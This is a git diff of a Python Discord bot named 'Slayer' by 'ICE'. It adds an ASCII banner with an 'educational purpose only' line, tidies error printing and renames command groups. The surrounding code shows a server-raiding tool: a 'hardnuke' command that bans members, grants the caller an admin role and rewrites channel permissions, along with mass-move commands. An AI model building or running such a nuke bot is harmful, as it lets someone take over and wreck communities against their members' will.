@@ -23,7 +23,18 @@ async def msg_delete(ctx):
     except:
         print(Fore.YELLOW + "Can't delete your message")
 
-print(Fore.CYAN + "Sluga by ICE")
+print(Fore.LIGHTRED_EX + "\n")
+print("  _____ _                       \n"
+      " / ____| |                      \n"
+      "| (___ | | __ _ _   _  ___ _ __ \n"
+      " \___ \| |/ _` | | | |/ _ \ '__|\n"
+      " ____) | | (_| | |_| |  __/ |   \n"
+      "|_____/|_|\__,_|\__, |\___|_|   \n"
+      "                 __/ |          \n"
+      "                |___/           \n"
+      "\n"
+      "Created by ICE\n"
+      "Use for educational Purpose only!\n")
 
 try:
     with open(f"config.json", encoding='utf8') as data:
@@ -48,6 +59,7 @@ except FileNotFoundError:
     }
     with open("config.json", "w") as data:
         json.dump(config, data, indent=2)
+    print(Fore.CYAN + "Created config.json")
 
 
 bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
@@ -62,16 +74,15 @@ async def on_ready():
 async def on_command_error(ctx, err):
     if isinstance(err, errors.BadArgument):
         return
-    _traceback = ''.join(traceback.format_tb(err.__traceback__))
-    print(type(err).__name__, _traceback, err)
+    print(type(err).__name__, ''.join(traceback.format_tb(err.__traceback__)), err)
 
 
 @bot.group(aliases=["all", "a"])
-async def allusersroles(ctx):
+async def allusersandroles(ctx):
     pass
 
 
-@allusersroles.group(aliases=["users", "u"])
+@allusersandroles.group(aliases=["users", "u"])
 async def allusers(ctx):
     pass
 
@@ -195,7 +206,7 @@ async def allmove(ctx, channel: int = None):
             print(Fore.YELLOW + f"Can't move {m.name} ({e})")
 
 
-@allusersroles.group(aliases=["channels", "ch"])
+@allusersandroles.group(aliases=["channels", "ch"])
 async def allchannels(ctx):
     pass
 
@@ -319,7 +330,7 @@ async def hardnuke(ctx, ban: bool = True, *, text: str = "Резня"):
         await ctx.message.author.add_roles(role)
         print(Fore.GREEN + f"Added admin role")
     except Exception as e:
-        print(Fore.GREEN + f"Add admin role ({e})")
+        print(Fore.GREEN + f"Can't add admin role ({e})")
 
     overwrites = {ctx.guild.default_role: discord.PermissionOverwrite(send_messages=True),
              ctx.author: discord.PermissionOverwrite(send_messages=True)}
